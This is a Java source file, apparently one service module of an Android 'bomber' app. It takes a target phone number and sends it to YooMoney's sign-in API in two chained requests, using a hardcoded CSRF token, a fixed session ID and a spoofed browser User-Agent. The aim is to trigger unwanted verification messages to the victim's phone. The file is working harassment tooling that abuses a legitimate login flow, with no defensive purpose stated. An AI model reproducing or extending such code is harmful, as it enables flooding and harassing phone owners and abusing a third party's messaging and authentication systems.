package com.dm.bomber.services;

import androidx.annotation.NonNull;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.Headers;
import okhttp3.MediaType;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class YooMoney extends Service {
    private final Headers HEADERS = new Headers.Builder()
            .add("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36")
            .add("x-csrf-token", "2a8d9ddde454a4866a312440f76ff2066f314a9d:1633861429348")
            .build();

    @Override
    public void run(Callback callback) {
        JSONObject json = new JSONObject();

        try {
            json.put("sessionId", "cb15ffe3-e806-5566-9872-166ac1aeacbe");
            json.put("login", getFormattedPhone());
            json.put("origin", "Wallet");
        } catch (JSONException e) {
            e.printStackTrace();
        }

        client.newCall(new Request.Builder()
                .url("https://yoomoney.ru/yooid/signin/api/process/start/standard")
                .post(RequestBody.create(json.toString(), MediaType.parse("application/json")))
                .headers(HEADERS)
                .build()).enqueue(new Callback() {
            @Override
            public void onFailure(@NonNull Call call, @NonNull IOException e) {
                callback.onFailure(call, e);
            }

            @Override
            public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
                try {
                    JSONObject json = new JSONObject(response.body().string());
                    JSONObject req = new JSONObject();

                    req.put("login", json.getJSONObject("result").get("normalizedLoginValue"));
                    req.put("loginType", "PhoneNumber");
                    req.put("processId", json.getJSONObject("result").get("processId"));

                    client.newCall(new Request.Builder()
                            .url("https://yoomoney.ru/yooid/signin/api/login/set")
                            .post(RequestBody.create(req.toString(), MediaType.parse("application/json")))
                            .headers(HEADERS)
                            .build()).enqueue(callback);
                } catch (JSONException e) {
                    callback.onResponse(call, response);
                }
            }
        });
    }
}
